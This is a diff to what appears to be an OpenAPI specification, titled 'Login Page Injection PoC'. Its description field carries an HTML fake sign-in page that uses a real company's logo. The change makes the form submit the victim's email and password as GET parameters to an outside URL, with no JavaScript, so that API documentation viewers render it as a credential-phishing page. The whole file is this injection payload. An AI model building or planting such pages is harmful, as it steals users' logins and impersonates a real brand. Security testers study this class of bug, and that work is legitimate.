@@ -3,26 +3,24 @@ info:
   title: Login Page Injection PoC
   version: "1.0.0"
   description: |
-    <!-- POC: Fake Login Page with Redirect -->
+    <!-- POC: Fake Login Page with Redirect (HTML only, no JS) -->
     <div style="max-width:380px;margin:40px auto;padding:32px;background:#fff;
                 border-radius:16px;box-shadow:0 4px 16px rgba(0,0,0,0.15);
                 font-family:Arial, sans-serif;text-align:center;">
       <!-- Logo -->
       <div style="margin-bottom:20px;">
-        <img src="https://media.licdn.com/dms/image/v2/D4E0BAQE9NHb7PLUGFg/company-logo_200_200/company-logo_200_200/0/1731376928297/mr_mrs_smith_logo?e=2147483647&v=beta&t=4K1brhp8Hb184KmMcM-rvr_ptF5-LqA019nxq9WTzOg" alt="Logo" style="border-radius:50%;">
+        <img src="https://media.licdn.com/dms/image/v2/D4E0BAQE9NHb7PLUGFg/company-logo_200_200/company-logo_200_200/0/1731376928297/mr_mrs_smith_logo?e=2147483647&v=beta&t=4K1brhp8Hb184KmMcM-rvr_ptF5-LqA019nxq9WTzOg" alt="Logo" style="border-radius:50%;width:80px;height:80px;">
       </div>
       <h2 style="margin-bottom:20px;color:#222;">Sign in to your account</h2>
-      <form style="display:flex;flex-direction:column;gap:14px;">
-        <input type="text" placeholder="Email address" 
+      <form action="https://example.com/redirected" method="get" 
+            style="display:flex;flex-direction:column;gap:14px;">
+        <input type="text" name="email" placeholder="Email address" 
                style="padding:12px;border:1px solid #ccc;border-radius:8px;font-size:14px;">
-        <input type="password" placeholder="Password" 
+        <input type="password" name="password" placeholder="Password" 
                style="padding:12px;border:1px solid #ccc;border-radius:8px;font-size:14px;">
-        <button type="button" 
+        <button type="submit" 
                 style="padding:12px;background:#2563eb;color:#fff;font-weight:bold;
-                       border:none;border-radius:8px;cursor:pointer;transition:0.3s;"
-                onclick="window.location.href='https://example.com/redirected';"
-                onmouseover="this.style.opacity=0.85;" 
-                onmouseout="this.style.opacity=1;">
+                       border:none;border-radius:8px;cursor:pointer;transition:0.3s;">
           Login
         </button>
       </form>
